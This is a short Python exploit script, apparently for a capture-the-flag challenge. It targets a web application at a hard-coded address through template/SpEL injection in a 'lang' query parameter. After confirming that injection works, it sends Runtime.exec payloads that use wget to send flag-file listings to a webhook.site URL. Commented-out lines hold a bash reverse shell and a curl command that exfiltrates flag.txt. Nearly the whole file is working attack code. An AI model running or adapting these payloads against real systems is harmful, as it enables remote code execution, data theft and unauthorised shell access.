import requests,urllib.parse,time

payload_template = '__${payload}__::.x' 
payload_test = '7*7'

ip = 'http://83.136.252.126'
port = 42709


session = requests.Session()
session.post(f'{ip}:{port}/register', data={'username':'user', 'password':'password'})
session.post(f'{ip}:{port}/login', data={'username':'user', 'password':'password'})

final_payload = payload_template.replace('payload',payload_test)
print(f"Final payload: {final_payload}")

response = session.get(f"{ip}:{port}/?lang={urllib.parse.quote(final_payload)}")

if '49' in response.text:
    print('Exploit test successful')
else:
    print('Exploit test failed')
    exit()

# if you have a public ip
#payload = 'T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/172.17.0.1/9001 0>&1"})'
payload_list = [#'T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "apt install -y wget"})',
                '''T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "wget 'https://webhook.site/6029bece-ef3d-4525-a852-f95c12561590?p='+$(ls flag*)"})''',
                 ]
                # '''T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "curl 'https://webhook.site/6029bece-ef3d-4525-a852-f95c12561590?p='+$(cat flag.txt)"})''']

for payload in payload_list:
#https://webhook.site/0d42e40c-b263-4a28-bb4e-da7438c7c362
    final_payload = payload_template.replace('payload',payload)
    response = session.get(f"{ip}:{port}/?lang={urllib.parse.quote(final_payload)}")
    print(response.text)
    time.sleep(5)



